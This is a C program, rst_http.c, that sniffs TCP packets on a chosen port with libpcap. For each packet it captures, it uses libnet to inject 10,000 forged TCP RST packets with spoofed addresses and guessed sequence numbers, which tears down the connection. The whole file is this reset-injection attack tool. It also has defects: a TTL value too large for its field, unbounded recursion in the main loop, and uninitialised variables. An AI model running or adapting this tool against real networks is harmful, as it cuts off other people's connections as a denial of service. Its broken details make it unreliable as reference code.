/**
 * rst_http.c
 */

#include "sniffer.h"
#include "netlib.h"
#include "netlog.h"

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <pcap.h>
#include <stdbool.h>
#include <libnet.h>
#include <unistd.h>

#define DEVICE_BUF_SIZE 128


pcap_t* handler;
libnet_t* netcons;

int counter;

struct ethernet_hdr* global_ethheader;
struct ip_hdr* global_ipheader;
struct tcp_hdr* global_tcpheader;
uint32_t global_seq;



void leavesniffer(int sig) {
	struct pcap_stat stats;
	if (pcap_stats(handler, &stats) >= 0) {
	
	}
	pcap_close(handler);
	libnet_destroy(netcons);
	exit(0);
}


void sendTCPPacket(struct in_addr srcip, struct in_addr dstip, u_short sport, u_short dport, unsigned int seq, struct ethernet_hdr* ethheader) {

	libnet_t* l = netcons;		
	// Replaced all libnet_get_prand(LIBNET_PRu16) for performance..
	libnet_ptag_t t;
	libnet_seed_prand(l);
	uint32_t someValue = 1000000;
	/* TCP Header and IP Header describes the message sent to us, 
	 * so we should reverse the order of source and destination... */
	t = libnet_build_tcp(
		sport,      /* src port */
		dport,      /* dst port */
		seq,         /* seq num */
		0,    /* ack num */
		TCP_RST,       /* tcp flag */
		10000,         /* window size */
		0,             /* checksum (0 for autofill) */
		0,             /* urgent pointer */
		LIBNET_TCP_H,           /* packet size */
		NULL,           /* payload */
		0,           /* payload_size*/
		l,           /* libnet handle */
		0            /* ptag protocol tag to modify an existing header, 0 to build a new one
		 */
	);

	if (t == -1) {
		printf("Failed to build TCP header: %s\n",
			libnet_geterror(l)
		);
		leavesniffer(1);
	}

	t = libnet_build_ipv4(
		LIBNET_IPV4_H + LIBNET_TCP_H,    /* length */
		IPTOS_LOWDELAY,    /* type of service */
		0,  /* ip id */
		0,    /* ip frag */
		255,    /* TTL */
		IP_TCP,  /* IP protocol */
		0,       /*checksum*/
		*((u_long*) &(srcip)),   /* source ip */
		*((u_long*) &(dstip)),   /* destination ip */
		NULL,     /* payload */
		0,        /* payloadsize */
		l,        /* libnet handle */
		0         /* libnet id */
	);
	 
	if (t == -1) {
		printf("Failed to build IP header: %s\n",
			libnet_geterror(l)
		);
		leavesniffer(1);
	}

	t = libnet_autobuild_ethernet(
		ethheader->ether_src_addr,  /* const uint8_t *dst */
		0,  /* uint16_t type: libnet protocol tag*/
		l			 /* libnet handler */
	);

	if (t == -1) {
		printf("Failed to autobuild Ethernet header: %s\n",
			libnet_geterror(l)
		);
	}

	if (libnet_write(l) == -1) {
		printf("Falied to write packet: %s\n",
			libnet_geterror(l)
		);
	}
	libnet_clear_packet(l);
	return;
}




void construct_reset_pkt(libnet_t* l, struct tcp_hdr* tcpheader, struct ip_hdr* ipheader, struct ethernet_hdr* ethheader, int payload_size) {
		
	// Replaced all libnet_get_prand(LIBNET_PRu16) for performance..
	libnet_ptag_t t;
	libnet_seed_prand(l);
	uint32_t someValue = 1000000;
	counter += 500;
	/* TCP Header and IP Header describes the message sent to us, 
	 * so we should reverse the order of source and destination... */
	t = libnet_build_tcp(
		ntohs(tcpheader->tcp_dst_port),      /* src port */
		ntohs(tcpheader->tcp_src_port),      /* dst port */
		(ntohl(tcpheader->tcp_ack) + counter),         /* seq num */
		(ntohl(tcpheader->tcp_seq)),    /* ack num */
		TCP_RST,       /* tcp flag */
		4096,         /* window size */
		0,             /* checksum (0 for autofill) */
		0,             /* urgent pointer */
		LIBNET_TCP_H,           /* packet size */
		NULL,           /* payload */
		0,           /* payload_size*/
		l,           /* libnet handle */
		0            /* ptag protocol tag to modify an existing header, 0 to build a new one
		 */
	);

	if (t == -1) {
		printf("Failed to build TCP header: %s\n",
			libnet_geterror(l)
		);
		leavesniffer(1);
	}

	t = libnet_build_ipv4(
		LIBNET_IPV4_H + LIBNET_TCP_H,    /* length */
		IPTOS_LOWDELAY,    /* type of service */
		0,  /* ip id */
		0,    /* ip frag */
		8192,    /* TTL */
		IP_TCP,  /* IP protocol */
		0,       /*checksum*/
		*((u_long*) &(ipheader->ip_dst_addr)),   /* source ip */
		*((u_long*) &(ipheader->ip_src_addr)),   /* destination ip */
		NULL,     /* payload */
		0,        /* payloadsize */
		l,        /* libnet handle */
		0         /* libnet id */
	);
	 
	if (t == -1) {
		printf("Failed to build IP header: %s\n",
			libnet_geterror(l)
		);
		leavesniffer(1);
	}

	t = libnet_autobuild_ethernet(
		ethheader->ether_src_addr,  /* const uint8_t *dst */
		0,  /* uint16_t type: libnet protocol tag*/
		l			 /* libnet handler */
	);

	if (t == -1) {
		printf("Failed to autobuild Ethernet header: %s\n",
			libnet_geterror(l)
		);
	}

	if (libnet_write(l) == -1) {
		printf("Falied to write packet: %s\n",
			libnet_geterror(l)
		);
	}
	libnet_clear_packet(l);
	return;
}


void parse_pkt(struct pcap_pkthdr* header, const u_char* data) {
	struct ip_hdr* ipheader;
	struct tcp_hdr* tcpheader;
	struct icmp_hdr* icmpheader;
	struct ethernet_hdr* ethheader;
	u_char* payload;

	bool has_ip_header = true;
	bool has_tcp_header = false;
	bool has_payload = true;
	bool has_icmp = false;

	int ip_size;
	int tcp_size;
	int payload_size;

	ethheader = (struct ethernet_hdr*) data;
	ipheader = (struct ip_hdr*) (data + ETHER_HDR_LEN);
	ip_size = ipheader->ip_hlen * INFO_WORD_SIZE;
	if (ip_size < 20) {
		has_ip_header = false;
	}
	if (ipheader->ip_protocol == IP_ICMP) {
		icmpheader = (struct icmp_hdr*) (data + ip_size + ETHER_HDR_LEN);
		has_icmp = true;
	} else if (ipheader->ip_protocol == IP_TCP) {
		has_tcp_header = true;	
	}

	tcpheader = (struct tcp_hdr*) (data + ETHER_HDR_LEN + ip_size);
	tcp_size = (tcpheader->tcp_off) * INFO_WORD_SIZE;
	if (tcp_size < 20) {
		has_tcp_header = false;
	}

	//payload = (u_char*) (data + ETHER_HDR_LEN + ip_size + tcp_size);
	//payload_size = ntohs(ipheader->ip_len) - (ip_size + tcp_size);
	//if (payload_size <= 0) {
	//	has_payload = false;
	//}

	// log_ethernet(ethheader);
	// if (has_ip_header) log_ip(ipheader);
	// if (has_tcp_header) log_tcp(tcpheader, payload_size);
	// if (has_payload && has_tcp_header) log_payload(payload, payload_size);
	// if (has_icmp) log_icmp(icmpheader);
	// printf("\n");
	
	counter = 0;
	for (int i = 0; i < 10000; i++) {
	construct_reset_pkt(netcons, tcpheader, ipheader, ethheader, payload_size);
	}
	return;
}


void main_loop(pcap_t* pd) {
	struct pcap_pkthdr *pktHeader;
	const u_char *pktData;
	int status;
	status = pcap_next_ex(pd, &pktHeader, &pktData);

	switch (status) {
		case 1:
			parse_pkt(pktHeader, pktData);
			main_loop(pd);
			break;
		case 0:
			main_loop(pd);
			break;
		case -2:
			printf("Breakloop called - exiting...");
			leavesniffer(0);
		default:
			printf("Recieved unrecognized status in mainloop().");
			leavesniffer(1);
	}
	return;
}


int main (int argc, char** argv) {
	if (argc < 2 || argc > 3) {
		printf("Usage: ./rst_http.c <port> [dev_name]\n");
		exit(1);
	}
	int port = atoi(argv[1]);
	char device[DEVICE_BUF_SIZE];
	if (argc == 3) {
		strncpy(device, argv[2], DEVICE_BUF_SIZE);
	}

	char filterbuf[DEVICE_BUF_SIZE];
	sprintf(filterbuf, "tcp port %d and src port %d and inbound", port, port);
	if ((handler = open_pcap_socket_filtered(device, filterbuf))) {
		if ((netcons = open_libnet_handler(device))) {
			signal(SIGTERM, leavesniffer); 
			signal(SIGINT, leavesniffer);
			signal(SIGQUIT, leavesniffer);
			main_loop(handler);
			leavesniffer(0);
		}
	}
	return 0;	
}
